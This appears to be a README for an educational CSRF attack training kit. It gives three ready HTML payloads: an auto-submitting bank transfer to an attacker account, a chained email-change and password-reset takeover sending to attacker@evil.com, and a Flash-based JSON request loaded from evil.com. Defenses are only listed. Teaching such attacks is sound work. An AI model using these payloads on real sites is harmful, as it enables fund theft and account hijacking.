# CSRF Exploit Demo Kit

## What the Tool is For:
A comprehensive Cross-Site Request Forgery (CSRF) demonstration and training toolkit that creates realistic attack scenarios, demonstrates chained attacks, and provides defensive techniques for educational purposes.

## About:
CSRF attacks trick users into submitting malicious requests to web applications where they're authenticated. This kit demonstrates various CSRF attack vectors, from simple form submissions to complex chained attacks exploiting multiple application functionalities.

## General Algorithm:
```
1. Vulnerability Analysis
   - Identify state-changing endpoints
   - Analyze authentication mechanisms
   - Check CSRF token implementations

2. Attack Vector Creation
   - Form-based CSRF
   - JSON-based CSRF
   - GET-based CSRF
   - Chained multi-step attacks

3. Exploit Crafting
   - Auto-form generation
   - Token extraction/bypass
   - Session riding
   - CORS exploitation

4. Defense Bypass Testing
   - CSRF token prediction
   - Header manipulation
   - Referrer bypass
   - SameSite cookie testing

5. Demonstration & Training
   - Live attack simulations
   - Defense implementations
   - Educational scenarios
```

## How to Run the Code:

### Python Version:
```bash
# Install dependencies
pip install jinja2

# Start the demo server
python3 csrf_demo_kit.py

# Generate specific exploit
python3 csrf_demo_kit.py --generate banking

# Run on specific port
python3 csrf_demo_kit.py --port 8080
```

### C Version:
```bash
# Install dependencies
sudo apt-get install libcurl4-openssl-dev

# Compile
gcc -o csrf_demo csrf_demo_kit.c -lcurl

# Run
./csrf_demo
```

## Example Attack Scenarios:

### 1. Basic Banking CSRF:
```html
<!-- exploit_banking.html -->
<html>
<body>
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to_account" value="attacker123">
  <input type="hidden" name="amount" value="5000">
  <input type="hidden" name="description" value="Loan payment">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

### 2. Chained Attack - Email Change + Password Reset:
```html
<!-- chained_csrf.html -->
<html>
<body>
<script>
// First: Change email to attacker-controlled
fetch('http://app.com/change-email', {
  method: 'POST',
  credentials: 'include',
  body: 'new_email=attacker@evil.com'
}).then(() => {
  // Second: Trigger password reset to new email
  return fetch('http://app.com/password-reset', {
    method: 'POST',
    credentials: 'include', 
    body: 'email=attacker@evil.com'
  });
});
</script>
</body>
</html>
```

### 3. JSON CSRF with Flash Bypass:
```html
<!-- json_csrf.html -->
<html>
<body>
<object width="1" height="1" type="application/x-shockwave-flash" 
        data="http://evil.com/csrf.swf?url=http://api.com/endpoint">
  <param name="FlashVars" 
         value="url=http://api.com/endpoint&data={\"action\":\"delete\"}">
</object>
</body>
</html>
```

## Key Features:

1. **Multiple Attack Vectors**: Form-based, image-based, JSON, and chained attacks
2. **Realistic Scenarios**: Banking transfers, profile changes, admin actions
3. **Defense Demonstrations**: CSRF tokens, SameSite cookies, custom headers
4. **Educational Content**: Attack explanations and defense mechanisms
5. **Live Demos**: Interactive demonstration server

## Educational Value:

This toolkit teaches students:
- CSRF attack mechanics and impact
- Various CSRF attack vectors and techniques
- Defense implementation strategies
- Real-world vulnerability assessment
- Secure coding practices
- Browser security mechanisms
